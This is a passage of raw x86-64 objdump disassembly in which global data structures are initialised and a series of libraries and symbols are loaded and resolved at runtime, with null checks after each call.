  40d3c2:	48 89 0d 5f 29 01 00 	mov    %rcx,0x1295f(%rip)        # 0x41fd28
  40d3c9:	48 8d 0d e0 2c 01 00 	lea    0x12ce0(%rip),%rcx        # 0x4200b0
  40d3d0:	48 89 15 b1 28 01 00 	mov    %rdx,0x128b1(%rip)        # 0x41fc88
  40d3d7:	48 8d 15 82 28 01 00 	lea    0x12882(%rip),%rdx        # 0x41fc60
  40d3de:	48 89 15 5b 29 01 00 	mov    %rdx,0x1295b(%rip)        # 0x41fd40
  40d3e5:	48 8d 15 9c 20 00 00 	lea    0x209c(%rip),%rdx        # 0x40f488
  40d3ec:	48 89 15 15 2a 01 00 	mov    %rdx,0x12a15(%rip)        # 0x41fe08
  40d3f3:	48 8d 15 06 29 01 00 	lea    0x12906(%rip),%rdx        # 0x41fd00
  40d3fa:	48 89 15 57 2a 01 00 	mov    %rdx,0x12a57(%rip)        # 0x41fe58
  40d401:	48 8d 15 08 2d 01 00 	lea    0x12d08(%rip),%rdx        # 0x420110
  40d408:	48 89 0d 21 2e 01 00 	mov    %rcx,0x12e21(%rip)        # 0x420230
  40d40f:	48 8d 0d ca 2b 01 00 	lea    0x12bca(%rip),%rcx        # 0x41ffe0
  40d416:	48 89 3d 0b 2d 01 00 	mov    %rdi,0x12d0b(%rip)        # 0x420128
  40d41d:	48 8d 3d 1c 2d 01 00 	lea    0x12d1c(%rip),%rdi        # 0x420140
  40d424:	48 89 15 f5 2b 01 00 	mov    %rdx,0x12bf5(%rip)        # 0x420020
  40d42b:	48 89 0d ee 2c 01 00 	mov    %rcx,0x12cee(%rip)        # 0x420120
  40d432:	48 8d 0d 67 23 00 00 	lea    0x2367(%rip),%rcx        # 0x40f7a0
  40d439:	48 89 3d e8 2b 01 00 	mov    %rdi,0x12be8(%rip)        # 0x420028
  40d440:	48 8d 3d 59 2b 01 00 	lea    0x12b59(%rip),%rdi        # 0x41ffa0
  40d447:	c6 05 1a 28 01 00 18 	movb   $0x18,0x1281a(%rip)        # 0x41fc68
  40d44e:	c6 05 14 28 01 00 02 	movb   $0x2,0x12814(%rip)        # 0x41fc69
  40d455:	c6 05 d4 28 01 00 01 	movb   $0x1,0x128d4(%rip)        # 0x41fd30
  40d45c:	48 c7 05 d1 28 01 00 	movq   $0x0,0x128d1(%rip)        # 0x41fd38
  40d463:	00 00 00 00 
  40d467:	4c 89 25 da 28 01 00 	mov    %r12,0x128da(%rip)        # 0x41fd48
  40d46e:	c6 05 7b 29 01 00 01 	movb   $0x1,0x1297b(%rip)        # 0x41fdf0
  40d475:	48 c7 05 78 29 01 00 	movq   $0x8,0x12978(%rip)        # 0x41fdf8
  40d47c:	08 00 00 00 
  40d480:	4c 89 2d 79 29 01 00 	mov    %r13,0x12979(%rip)        # 0x41fe00
  40d487:	48 c7 05 8e 28 01 00 	movq   $0x2,0x1288e(%rip)        # 0x41fd20
  40d48e:	02 00 00 00 
  40d492:	c6 05 67 28 01 00 02 	movb   $0x2,0x12867(%rip)        # 0x41fd00
  40d499:	48 c7 05 dc 2d 01 00 	movq   $0x38,0x12ddc(%rip)        # 0x420280
  40d4a0:	38 00 00 00 
  40d4a4:	c6 05 dd 2d 01 00 11 	movb   $0x11,0x12ddd(%rip)        # 0x420288
  40d4ab:	48 89 2d de 2d 01 00 	mov    %rbp,0x12dde(%rip)        # 0x420290
  40d4b2:	48 c7 05 83 2b 01 00 	movq   $0x10,0x12b83(%rip)        # 0x420040
  40d4b9:	10 00 00 00 
  40d4bd:	c6 05 84 2b 01 00 12 	movb   $0x12,0x12b84(%rip)        # 0x420048
  40d4c4:	48 c7 05 81 2b 01 00 	movq   $0x0,0x12b81(%rip)        # 0x420050
  40d4cb:	00 00 00 00 
  40d4cf:	c6 05 3a 2c 01 00 01 	movb   $0x1,0x12c3a(%rip)        # 0x420110
  40d4d6:	48 c7 05 37 2c 01 00 	movq   $0x0,0x12c37(%rip)        # 0x420118
  40d4dd:	00 00 00 00 
  40d4e1:	c6 05 58 2c 01 00 01 	movb   $0x1,0x12c58(%rip)        # 0x420140
  40d4e8:	48 c7 05 55 2c 01 00 	movq   $0x8,0x12c55(%rip)        # 0x420148
  40d4ef:	08 00 00 00 
  40d4f3:	48 89 05 8e 2c 01 00 	mov    %rax,0x12c8e(%rip)        # 0x420188
  40d4fa:	48 8d 05 2f 2d 01 00 	lea    0x12d2f(%rip),%rax        # 0x420230
  40d501:	48 89 05 a0 2b 01 00 	mov    %rax,0x12ba0(%rip)        # 0x4200a8
  40d508:	48 8d 05 71 2b 01 00 	lea    0x12b71(%rip),%rax        # 0x420080
  40d50f:	48 89 05 82 2d 01 00 	mov    %rax,0x12d82(%rip)        # 0x420298
  40d516:	48 8d 05 63 2d 01 00 	lea    0x12d63(%rip),%rax        # 0x420280
  40d51d:	48 89 05 cc 29 01 00 	mov    %rax,0x129cc(%rip)        # 0x41fef0
  40d524:	48 8d 05 a5 2c 01 00 	lea    0x12ca5(%rip),%rax        # 0x4201d0
  40d52b:	48 89 05 8e 29 01 00 	mov    %rax,0x1298e(%rip)        # 0x41fec0
  40d532:	48 8d 05 5e 1f 00 00 	lea    0x1f5e(%rip),%rax        # 0x40f497
  40d539:	48 89 35 18 2c 01 00 	mov    %rsi,0x12c18(%rip)        # 0x420158
  40d540:	48 8d 35 d9 2a 01 00 	lea    0x12ad9(%rip),%rsi        # 0x420020
  40d547:	48 89 05 9a 2c 01 00 	mov    %rax,0x12c9a(%rip)        # 0x4201e8
  40d54e:	48 8d 05 ab 2c 01 00 	lea    0x12cab(%rip),%rax        # 0x420200
  40d555:	48 89 35 ac 2b 01 00 	mov    %rsi,0x12bac(%rip)        # 0x420108
  40d55c:	48 8d 35 7d 2b 01 00 	lea    0x12b7d(%rip),%rsi        # 0x4200e0
  40d563:	48 89 05 5e 29 01 00 	mov    %rax,0x1295e(%rip)        # 0x41fec8
  40d56a:	48 8d 05 cf 28 01 00 	lea    0x128cf(%rip),%rax        # 0x41fe40
  40d571:	48 89 3d d8 2b 01 00 	mov    %rdi,0x12bd8(%rip)        # 0x420150
  40d578:	48 8d 3d 11 1f 00 00 	lea    0x1f11(%rip),%rdi        # 0x40f490
  40d57f:	48 89 35 d2 2a 01 00 	mov    %rsi,0x12ad2(%rip)        # 0x420058
  40d586:	48 8d 35 d3 29 01 00 	lea    0x129d3(%rip),%rsi        # 0x41ff60
  40d58d:	48 89 05 7c 2c 01 00 	mov    %rax,0x12c7c(%rip)        # 0x420210
  40d594:	48 8d 05 03 1f 00 00 	lea    0x1f03(%rip),%rax        # 0x40f49e
  40d59b:	48 89 35 1e 2b 01 00 	mov    %rsi,0x12b1e(%rip)        # 0x4200c0
  40d5a2:	48 8d 35 c7 2b 01 00 	lea    0x12bc7(%rip),%rsi        # 0x420170
  40d5a9:	48 89 3d 18 2b 01 00 	mov    %rdi,0x12b18(%rip)        # 0x4200c8
  40d5b0:	48 8d 3d 69 29 01 00 	lea    0x12969(%rip),%rdi        # 0x41ff20
  40d5b7:	48 89 05 5a 2c 01 00 	mov    %rax,0x12c5a(%rip)        # 0x420218
  40d5be:	48 8d 05 fb 28 01 00 	lea    0x128fb(%rip),%rax        # 0x41fec0
  40d5c5:	48 c7 05 30 2b 01 00 	movq   $0x2,0x12b30(%rip)        # 0x420100
  40d5cc:	02 00 00 00 
  40d5d0:	c6 05 09 2b 01 00 02 	movb   $0x2,0x12b09(%rip)        # 0x4200e0
  40d5d7:	c6 05 d2 2a 01 00 01 	movb   $0x1,0x12ad2(%rip)        # 0x4200b0
  40d5de:	48 c7 05 cf 2a 01 00 	movq   $0x8,0x12acf(%rip)        # 0x4200b8
  40d5e5:	08 00 00 00 
  40d5e9:	48 89 35 48 2c 01 00 	mov    %rsi,0x12c48(%rip)        # 0x420238
  40d5f0:	c6 05 79 2b 01 00 01 	movb   $0x1,0x12b79(%rip)        # 0x420170
  40d5f7:	48 c7 05 76 2b 01 00 	movq   $0x10,0x12b76(%rip)        # 0x420178
  40d5fe:	10 00 00 00 
  40d602:	48 89 3d 77 2b 01 00 	mov    %rdi,0x12b77(%rip)        # 0x420180
  40d609:	48 c7 05 8c 2a 01 00 	movq   $0x2,0x12a8c(%rip)        # 0x4200a0
  40d610:	02 00 00 00 
  40d614:	c6 05 65 2a 01 00 02 	movb   $0x2,0x12a65(%rip)        # 0x420080
  40d61b:	48 c7 05 ba 28 01 00 	movq   $0x50,0x128ba(%rip)        # 0x41fee0
  40d622:	50 00 00 00 
  40d626:	c6 05 bb 28 01 00 11 	movb   $0x11,0x128bb(%rip)        # 0x41fee8
  40d62d:	c6 05 9c 2b 01 00 01 	movb   $0x1,0x12b9c(%rip)        # 0x4201d0
  40d634:	48 c7 05 99 2b 01 00 	movq   $0x38,0x12b99(%rip)        # 0x4201d8
  40d63b:	38 00 00 00 
  40d63f:	4c 89 2d 9a 2b 01 00 	mov    %r13,0x12b9a(%rip)        # 0x4201e0
  40d646:	c6 05 b3 2b 01 00 01 	movb   $0x1,0x12bb3(%rip)        # 0x420200
  40d64d:	48 c7 05 b0 2b 01 00 	movq   $0x40,0x12bb0(%rip)        # 0x420208
  40d654:	40 00 00 00 
  40d658:	48 c7 05 5d 2b 01 00 	movq   $0x2,0x12b5d(%rip)        # 0x4201c0
  40d65f:	02 00 00 00 
  40d663:	48 89 05 5e 2b 01 00 	mov    %rax,0x12b5e(%rip)        # 0x4201c8
  40d66a:	48 8d 05 2f 2b 01 00 	lea    0x12b2f(%rip),%rax        # 0x4201a0
  40d671:	c6 05 28 2b 01 00 02 	movb   $0x2,0x12b28(%rip)        # 0x4201a0
  40d678:	48 89 05 79 28 01 00 	mov    %rax,0x12879(%rip)        # 0x41fef8
  40d67f:	e8 d7 79 ff ff       	call   0x40505b
  40d684:	48 8d 0d f5 20 00 00 	lea    0x20f5(%rip),%rcx        # 0x40f780
  40d68b:	48 85 c0             	test   %rax,%rax
  40d68e:	48 89 05 23 2c 01 00 	mov    %rax,0x12c23(%rip)        # 0x4202b8
  40d695:	0f 84 d3 f1 ff ff    	je     0x40c86e
  40d69b:	48 8d 15 04 1e 00 00 	lea    0x1e04(%rip),%rdx        # 0x40f4a6
  40d6a2:	48 89 c1             	mov    %rax,%rcx
  40d6a5:	e8 2e 78 ff ff       	call   0x404ed8
  40d6aa:	48 8b 0d 07 2c 01 00 	mov    0x12c07(%rip),%rcx        # 0x4202b8
  40d6b1:	48 8d 15 fc 1d 00 00 	lea    0x1dfc(%rip),%rdx        # 0x40f4b4
  40d6b8:	48 89 05 c1 cf 00 00 	mov    %rax,0xcfc1(%rip)        # 0x41a680
  40d6bf:	e8 14 78 ff ff       	call   0x404ed8
  40d6c4:	48 8b 0d ed 2b 01 00 	mov    0x12bed(%rip),%rcx        # 0x4202b8
  40d6cb:	48 8d 15 f6 1d 00 00 	lea    0x1df6(%rip),%rdx        # 0x40f4c8
  40d6d2:	48 89 05 9f cf 00 00 	mov    %rax,0xcf9f(%rip)        # 0x41a678
  40d6d9:	e8 fa 77 ff ff       	call   0x404ed8
  40d6de:	48 8b 0d d3 2b 01 00 	mov    0x12bd3(%rip),%rcx        # 0x4202b8
  40d6e5:	48 8d 15 bc 1c 00 00 	lea    0x1cbc(%rip),%rdx        # 0x40f3a8
  40d6ec:	48 89 05 7d cf 00 00 	mov    %rax,0xcf7d(%rip)        # 0x41a670
  40d6f3:	e8 e0 77 ff ff       	call   0x404ed8
  40d6f8:	48 8b 0d b9 2b 01 00 	mov    0x12bb9(%rip),%rcx        # 0x4202b8
  40d6ff:	48 8d 15 ee 1c 00 00 	lea    0x1cee(%rip),%rdx        # 0x40f3f4
  40d706:	48 89 05 5b cf 00 00 	mov    %rax,0xcf5b(%rip)        # 0x41a668
  40d70d:	e8 c6 77 ff ff       	call   0x404ed8
  40d712:	48 8d 0d c7 20 00 00 	lea    0x20c7(%rip),%rcx        # 0x40f7e0
  40d719:	48 89 05 40 cf 00 00 	mov    %rax,0xcf40(%rip)        # 0x41a660
  40d720:	e8 36 79 ff ff       	call   0x40505b
  40d725:	48 8d 0d 94 20 00 00 	lea    0x2094(%rip),%rcx        # 0x40f7c0
  40d72c:	48 85 c0             	test   %rax,%rax
  40d72f:	48 89 05 8a 2b 01 00 	mov    %rax,0x12b8a(%rip)        # 0x4202c0
  40d736:	0f 84 32 f1 ff ff    	je     0x40c86e
  40d73c:	48 8d 15 9b 1d 00 00 	lea    0x1d9b(%rip),%rdx        # 0x40f4de
  40d743:	48 89 c1             	mov    %rax,%rcx
  40d746:	e8 8d 77 ff ff       	call   0x404ed8
  40d74b:	48 8b 0d 6e 2b 01 00 	mov    0x12b6e(%rip),%rcx        # 0x4202c0
  40d752:	48 8d 15 98 1d 00 00 	lea    0x1d98(%rip),%rdx        # 0x40f4f1
  40d759:	48 89 05 60 cf 00 00 	mov    %rax,0xcf60(%rip)        # 0x41a6c0
  40d760:	e8 73 77 ff ff       	call   0x404ed8
  40d765:	48 8b 0d 54 2b 01 00 	mov    0x12b54(%rip),%rcx        # 0x4202c0
  40d76c:	48 8d 15 95 1d 00 00 	lea    0x1d95(%rip),%rdx        # 0x40f508
  40d773:	48 89 05 3e cf 00 00 	mov    %rax,0xcf3e(%rip)        # 0x41a6b8
  40d77a:	e8 59 77 ff ff       	call   0x404ed8
  40d77f:	48 8b 0d 3a 2b 01 00 	mov    0x12b3a(%rip),%rcx        # 0x4202c0
  40d786:	48 8d 15 88 1d 00 00 	lea    0x1d88(%rip),%rdx        # 0x40f515
  40d78d:	48 89 05 1c cf 00 00 	mov    %rax,0xcf1c(%rip)        # 0x41a6b0
  40d794:	e8 3f 77 ff ff       	call   0x404ed8
  40d799:	48 8b 0d 20 2b 01 00 	mov    0x12b20(%rip),%rcx        # 0x4202c0
  40d7a0:	48 8d 15 75 1d 00 00 	lea    0x1d75(%rip),%rdx        # 0x40f51c
  40d7a7:	48 89 05 fa ce 00 00 	mov    %rax,0xcefa(%rip)        # 0x41a6a8
  40d7ae:	e8 25 77 ff ff       	call   0x404ed8
  40d7b3:	48 8b 0d 06 2b 01 00 	mov    0x12b06(%rip),%rcx        # 0x4202c0
  40d7ba:	48 8d 15 6c 1d 00 00 	lea    0x1d6c(%rip),%rdx        # 0x40f52d
  40d7c1:	48 89 05 d8 ce 00 00 	mov    %rax,0xced8(%rip)        # 0x41a6a0
  40d7c8:	e8 0b 77 ff ff       	call   0x404ed8
  40d7cd:	48 8b 0d ec 2a 01 00 	mov    0x12aec(%rip),%rcx        # 0x4202c0
  40d7d4:	48 8d 15 5c 1d 00 00 	lea    0x1d5c(%rip),%rdx        # 0x40f537
  40d7db:	48 89 05 b6 ce 00 00 	mov    %rax,0xceb6(%rip)        # 0x41a698
  40d7e2:	e8 f1 76 ff ff       	call   0x404ed8
  40d7e7:	48 8b 0d d2 2a 01 00 	mov    0x12ad2(%rip),%rcx        # 0x4202c0
  40d7ee:	48 8d 15 4b 1d 00 00 	lea    0x1d4b(%rip),%rdx        # 0x40f540
  40d7f5:	48 89 05 94 ce 00 00 	mov    %rax,0xce94(%rip)        # 0x41a690
  40d7fc:	e8 d7 76 ff ff       	call   0x404ed8
  40d801:	48 8d 0d 18 20 00 00 	lea    0x2018(%rip),%rcx        # 0x40f820
  40d808:	48 89 05 79 ce 00 00 	mov    %rax,0xce79(%rip)        # 0x41a688
  40d80f:	e8 47 78 ff ff       	call   0x40505b
  40d814:	48 8d 0d e5 1f 00 00 	lea    0x1fe5(%rip),%rcx        # 0x40f800
  40d81b:	48 85 c0             	test   %rax,%rax
  40d81e:	48 89 05 a3 2a 01 00 	mov    %rax,0x12aa3(%rip)        # 0x4202c8
  40d825:	0f 84 43 f0 ff ff    	je     0x40c86e
  40d82b:	48 8d 15 1b 1d 00 00 	lea    0x1d1b(%rip),%rdx        # 0x40f54d
  40d832:	48 89 c1             	mov    %rax,%rcx
  40d835:	e8 9e 76 ff ff       	call   0x404ed8
  40d83a:	48 8b 0d 87 2a 01 00 	mov    0x12a87(%rip),%rcx        # 0x4202c8
  40d841:	48 8d 15 16 1d 00 00 	lea    0x1d16(%rip),%rdx        # 0x40f55e
  40d848:	48 89 05 a1 ce 00 00 	mov    %rax,0xcea1(%rip)        # 0x41a6f0
  40d84f:	e8 84 76 ff ff       	call   0x404ed8
  40d854:	48 8b 0d 6d 2a 01 00 	mov    0x12a6d(%rip),%rcx        # 0x4202c8
  40d85b:	48 8d 15 02 1d 00 00 	lea    0x1d02(%rip),%rdx        # 0x40f564
  40d862:	48 89 05 7f ce 00 00 	mov    %rax,0xce7f(%rip)        # 0x41a6e8
  40d869:	e8 6a 76 ff ff       	call   0x404ed8
  40d86e:	48 8b 0d 53 2a 01 00 	mov    0x12a53(%rip),%rcx        # 0x4202c8
  40d875:	48 8d 15 f2 1c 00 00 	lea    0x1cf2(%rip),%rdx        # 0x40f56e
  40d87c:	48 89 05 5d ce 00 00 	mov    %rax,0xce5d(%rip)        # 0x41a6e0
  40d883:	e8 50 76 ff ff       	call   0x404ed8
  40d888:	48 8b 0d 39 2a 01 00 	mov    0x12a39(%rip),%rcx        # 0x4202c8
  40d88f:	48 8d 15 ea 1c 00 00 	lea    0x1cea(%rip),%rdx        # 0x40f580
  40d896:	48 89 05 3b ce 00 00 	mov    %rax,0xce3b(%rip)        # 0x41a6d8
  40d89d:	e8 36 76 ff ff       	call   0x404ed8
  40d8a2:	48 8b 0d 1f 2a 01 00 	mov    0x12a1f(%rip),%rcx        # 0x4202c8
  40d8a9:	48 8d 15 df 1c 00 00 	lea    0x1cdf(%rip),%rdx        # 0x40f58f
  40d8b0:	48 89 05 19 ce 00 00 	mov    %rax,0xce19(%rip)        # 0x41a6d0
  40d8b7:	e8 1c 76 ff ff       	call   0x404ed8
  40d8bc:	48 8d 0d 9d 1f 00 00 	lea    0x1f9d(%rip),%rcx        # 0x40f860
  40d8c3:	48 89 05 fe cd 00 00 	mov    %rax,0xcdfe(%rip)        # 0x41a6c8
  40d8ca:	e8 8c 77 ff ff       	call   0x40505b
  40d8cf:	48 8d 0d 6a 1f 00 00 	lea    0x1f6a(%rip),%rcx        # 0x40f840
  40d8d6:	48 85 c0             	test   %rax,%rax
  40d8d9:	48 89 05 f0 29 01 00 	mov    %rax,0x129f0(%rip)        # 0x4202d0
  40d8e0:	0f 84 88 ef ff ff    	je     0x40c86e
  40d8e6:	48 8d 15 ae 1c 00 00 	lea    0x1cae(%rip),%rdx        # 0x40f59b
  40d8ed:	48 89 c1             	mov    %rax,%rcx
  40d8f0:	e8 e3 75 ff ff       	call   0x404ed8
  40d8f5:	48 8b 0d d4 29 01 00 	mov    0x129d4(%rip),%rcx        # 0x4202d0
  40d8fc:	48 8d 15 ac 1c 00 00 	lea    0x1cac(%rip),%rdx        # 0x40f5af
  40d903:	48 89 05 fe cd 00 00 	mov    %rax,0xcdfe(%rip)        # 0x41a708
  40d90a:	e8 c9 75 ff ff       	call   0x404ed8
  40d90f:	48 8b 0d ba 29 01 00 	mov    0x129ba(%rip),%rcx        # 0x4202d0
  40d916:	48 8d 15 a6 1c 00 00 	lea    0x1ca6(%rip),%rdx        # 0x40f5c3
  40d91d:	48 89 05 dc cd 00 00 	mov    %rax,0xcddc(%rip)        # 0x41a700
  40d924:	e8 af 75 ff ff       	call   0x404ed8
  40d929:	48 8d 0d 70 1f 00 00 	lea    0x1f70(%rip),%rcx        # 0x40f8a0
  40d930:	48 89 05 c1 cd 00 00 	mov    %rax,0xcdc1(%rip)        # 0x41a6f8
  40d937:	e8 1f 77 ff ff       	call   0x40505b
  40d93c:	48 8d 0d 3d 1f 00 00 	lea    0x1f3d(%rip),%rcx        # 0x40f880
  40d943:	48 85 c0             	test   %rax,%rax
  40d946:	48 89 05 8b 29 01 00 	mov    %rax,0x1298b(%rip)        # 0x4202d8
  40d94d:	0f 84 1b ef ff ff    	je     0x40c86e
  40d953:	48 8d 15 72 1c 00 00 	lea    0x1c72(%rip),%rdx        # 0x40f5cc
  40d95a:	48 89 c1             	mov    %rax,%rcx
  40d95d:	e8 76 75 ff ff       	call   0x404ed8
  40d962:	48 8d 0d 77 1f 00 00 	lea    0x1f77(%rip),%rcx        # 0x40f8e0
  40d969:	48 89 05 a0 cd 00 00 	mov    %rax,0xcda0(%rip)        # 0x41a710
  40d970:	e8 e6 76 ff ff       	call   0x40505b
  40d975:	48 8d 0d 44 1f 00 00 	lea    0x1f44(%rip),%rcx        # 0x40f8c0
  40d97c:	48 85 c0             	test   %rax,%rax
  40d97f:	48 89 05 5a 29 01 00 	mov    %rax,0x1295a(%rip)        # 0x4202e0
  40d986:	0f 84 e2 ee ff ff    	je     0x40c86e
  40d98c:	48 8d 15 45 1c 00 00 	lea    0x1c45(%rip),%rdx        # 0x40f5d8
  40d993:	48 89 c1             	mov    %rax,%rcx
  40d996:	e8 3d 75 ff ff       	call   0x404ed8
  40d99b:	48 8b 0d 3e 29 01 00 	mov    0x1293e(%rip),%rcx        # 0x4202e0
  40d9a2:	48 8d 15 3d 1c 00 00 	lea    0x1c3d(%rip),%rdx        # 0x40f5e6
  40d9a9:	48 89 05 78 cd 00 00 	mov    %rax,0xcd78(%rip)        # 0x41a728
  40d9b0:	e8 23 75 ff ff       	call   0x404ed8
  40d9b5:	48 8b 0d 24 29 01 00 	mov    0x12924(%rip),%rcx        # 0x4202e0
  40d9bc:	48 8d 15 32 1c 00 00 	lea    0x1c32(%rip),%rdx        # 0x40f5f5
  40d9c3:	48 89 05 56 cd 00 00 	mov    %rax,0xcd56(%rip)        # 0x41a720
  40d9ca:	e8 09 75 ff ff       	call   0x404ed8
  40d9cf:	48 8d 0d 4a 1f 00 00 	lea    0x1f4a(%rip),%rcx        # 0x40f920
  40d9d6:	48 89 05 3b cd 00 00 	mov    %rax,0xcd3b(%rip)        # 0x41a718
  40d9dd:	e8 79 76 ff ff       	call   0x40505b
  40d9e2:	48 8d 0d 17 1f 00 00 	lea    0x1f17(%rip),%rcx        # 0x40f900
  40d9e9:	48 85 c0             	test   %rax,%rax
  40d9ec:	48 89 05 f5 28 01 00 	mov    %rax,0x128f5(%rip)        # 0x4202e8
  40d9f3:	0f 84 75 ee ff ff    	je     0x40c86e
  40d9f9:	48 8d 15 01 1c 00 00 	lea    0x1c01(%rip),%rdx        # 0x40f601
  40da00:	48 89 c1             	mov    %rax,%rcx
  40da03:	e8 d0 74 ff ff       	call   0x404ed8
  40da08:	48 8b 0d d9 28 01 00 	mov    0x128d9(%rip),%rcx        # 0x4202e8
  40da0f:	48 8d 15 f8 1b 00 00 	lea    0x1bf8(%rip),%rdx        # 0x40f60e
  40da16:	48 89 05 23 cd 00 00 	mov    %rax,0xcd23(%rip)        # 0x41a740
  40da1d:	e8 b6 74 ff ff       	call   0x404ed8
  40da22:	48 8b 0d bf 28 01 00 	mov    0x128bf(%rip),%rcx        # 0x4202e8
  40da29:	48 8d 15 ef 1b 00 00 	lea    0x1bef(%rip),%rdx        # 0x40f61f
  40da30:	48 89 05 01 cd 00 00 	mov    %rax,0xcd01(%rip)        # 0x41a738
  40da37:	e8 9c 74 ff ff       	call   0x404ed8
  40da3c:	48 8d 0d 1d 1f 00 00 	lea    0x1f1d(%rip),%rcx        # 0x40f960
  40da43:	48 89 05 e6 cc 00 00 	mov    %rax,0xcce6(%rip)        # 0x41a730
  40da4a:	e8 0c 76 ff ff       	call   0x40505b
  40da4f:	48 8d 0d ea 1e 00 00 	lea    0x1eea(%rip),%rcx        # 0x40f940
  40da56:	48 85 c0             	test   %rax,%rax
  40da59:	48 89 05 90 28 01 00 	mov    %rax,0x12890(%rip)        # 0x4202f0
  40da60:	0f 84 08 ee ff ff    	je     0x40c86e
  40da66:	48 8d 15 c1 1b 00 00 	lea    0x1bc1(%rip),%rdx        # 0x40f62e
  40da6d:	48 89 c1             	mov    %rax,%rcx
  40da70:	e8 63 74 ff ff       	call   0x404ed8
  40da75:	c6 05 ec cc 00 00 12 	movb   $0x12,0xccec(%rip)        # 0x41a768
  40da7c:	48 89 05 c5 cc 00 00 	mov    %rax,0xccc5(%rip)        # 0x41a748
  40da83:	48 8d 05 06 29 01 00 	lea    0x12906(%rip),%rax        # 0x420390
  40da8a:	48 89 05 8f 2a 01 00 	mov    %rax,0x12a8f(%rip)        # 0x420520
  40da91:	48 8d 05 a4 1b 00 00 	lea    0x1ba4(%rip),%rax        # 0x40f63c
  40da98:	48 89 05 39 29 01 00 	mov    %rax,0x12939(%rip)        # 0x4203d8
  40da9f:	48 8d 05 1a 29 01 00 	lea    0x1291a(%rip),%rax        # 0x4203c0
  40daa6:	48 89 05 53 28 01 00 	mov    %rax,0x12853(%rip)        # 0x420300
  40daad:	48 8d 05 95 1b 00 00 	lea    0x1b95(%rip),%rax        # 0x40f649
  40dab4:	48 89 05 4d 29 01 00 	mov    %rax,0x1294d(%rip)        # 0x420408
  40dabb:	48 8d 05 2e 29 01 00 	lea    0x1292e(%rip),%rax        # 0x4203f0
  40dac2:	48 89 05 3f 28 01 00 	mov    %rax,0x1283f(%rip)        # 0x420308
  40dac9:	48 8d 05 85 1b 00 00 	lea    0x1b85(%rip),%rax        # 0x40f655
  40dad0:	48 89 05 61 29 01 00 	mov    %rax,0x12961(%rip)        # 0x420438
  40dad7:	48 8d 05 42 29 01 00 	lea    0x12942(%rip),%rax        # 0x420420
  40dade:	48 89 05 2b 28 01 00 	mov    %rax,0x1282b(%rip)        # 0x420310
  40dae5:	48 8d 05 14 28 01 00 	lea    0x12814(%rip),%rax        # 0x420300
  40daec:	48 89 05 85 29 01 00 	mov    %rax,0x12985(%rip)        # 0x420478
  40daf3:	48 8d 05 56 29 01 00 	lea    0x12956(%rip),%rax        # 0x420450
  40dafa:	48 89 05 37 28 01 00 	mov    %rax,0x12837(%rip)        # 0x420338
  40db01:	48 8d 05 18 28 01 00 	lea    0x12818(%rip),%rax        # 0x420320
  40db08:	48 89 05 91 28 01 00 	mov    %rax,0x12891(%rip)        # 0x4203a0
  40db0f:	48 8d 05 4a 17 00 00 	lea    0x174a(%rip),%rax        # 0x40f260
  40db16:	48 89 05 8b 28 01 00 	mov    %rax,0x1288b(%rip)        # 0x4203a8
  40db1d:	48 8d 05 5c 29 01 00 	lea    0x1295c(%rip),%rax        # 0x420480
  40db24:	48 89 05 fd 29 01 00 	mov    %rax,0x129fd(%rip)        # 0x420528
  40db2b:	48 8d 05 35 17 00 00 	lea    0x1735(%rip),%rax        # 0x40f267
  40db32:	48 c7 05 23 cc 00 00 	movq   $0x20,0xcc23(%rip)        # 0x41a760
  40db39:	20 00 00 00 
  40db3d:	48 c7 05 28 cc 00 00 	movq   $0x0,0xcc28(%rip)        # 0x41a770
  40db44:	00 00 00 00 
  40db48:	c6 05 1a cc 00 00 02 	movb   $0x2,0xcc1a(%rip)        # 0x41a769
  40db4f:	48 c7 05 c6 27 01 00 	movq   $0x1,0x127c6(%rip)        # 0x420320
  40db56:	01 00 00 00 
  40db5a:	c6 05 c7 27 01 00 0e 	movb   $0xe,0x127c7(%rip)        # 0x420328
  40db61:	48 c7 05 c4 27 01 00 	movq   $0x0,0x127c4(%rip)        # 0x420330
  40db68:	00 00 00 00 
  40db6c:	c6 05 b6 27 01 00 03 	movb   $0x3,0x127b6(%rip)        # 0x420329
  40db73:	c6 05 46 28 01 00 01 	movb   $0x1,0x12846(%rip)        # 0x4203c0
  40db7a:	48 c7 05 43 28 01 00 	movq   $0x0,0x12843(%rip)        # 0x4203c8
  40db81:	00 00 00 00 
  40db85:	c6 05 64 28 01 00 01 	movb   $0x1,0x12864(%rip)        # 0x4203f0
  40db8c:	48 c7 05 61 28 01 00 	movq   $0x1,0x12861(%rip)        # 0x4203f8
  40db93:	01 00 00 00 
  40db97:	c6 05 82 28 01 00 01 	movb   $0x1,0x12882(%rip)        # 0x420420
  40db9e:	48 c7 05 7f 28 01 00 	movq   $0x2,0x1287f(%rip)        # 0x420428
  40dba5:	02 00 00 00 
  40dba9:	48 c7 05 bc 28 01 00 	movq   $0x3,0x128bc(%rip)        # 0x420470
  40dbb0:	03 00 00 00 
  40dbb4:	c6 05 95 28 01 00 02 	movb   $0x2,0x12895(%rip)        # 0x420450
  40dbbb:	c6 05 ce 27 01 00 01 	movb   $0x1,0x127ce(%rip)        # 0x420390
  40dbc2:	48 c7 05 cb 27 01 00 	movq   $0x0,0x127cb(%rip)        # 0x420398
  40dbc9:	00 00 00 00 
  40dbcd:	c6 05 ac 28 01 00 01 	movb   $0x1,0x128ac(%rip)        # 0x420480
  40dbd4:	48 c7 05 a9 28 01 00 	movq   $0x8,0x128a9(%rip)        # 0x420488
  40dbdb:	08 00 00 00 
  40dbdf:	48 89 05 b2 28 01 00 	mov    %rax,0x128b2(%rip)        # 0x420498
  40dbe6:	48 8d 05 c3 28 01 00 	lea    0x128c3(%rip),%rax        # 0x4204b0
  40dbed:	48 89 05 3c 29 01 00 	mov    %rax,0x1293c(%rip)        # 0x420530
  40dbf4:	48 8d 05 68 1a 00 00 	lea    0x1a68(%rip),%rax        # 0x40f663
  40dbfb:	48 89 05 c6 28 01 00 	mov    %rax,0x128c6(%rip)        # 0x4204c8
  40dc02:	48 8d 05 d7 28 01 00 	lea    0x128d7(%rip),%rax        # 0x4204e0
  40dc09:	48 89 05 28 29 01 00 	mov    %rax,0x12928(%rip)        # 0x420538
  40dc10:	48 8d 05 53 1a 00 00 	lea    0x1a53(%rip),%rax        # 0x40f66a
  40dc17:	48 89 05 da 28 01 00 	mov    %rax,0x128da(%rip)        # 0x4204f8
  40dc1e:	48 8d 05 fb 28 01 00 	lea    0x128fb(%rip),%rax        # 0x420520
  40dc25:	48 89 05 5c 27 01 00 	mov    %rax,0x1275c(%rip)        # 0x420388
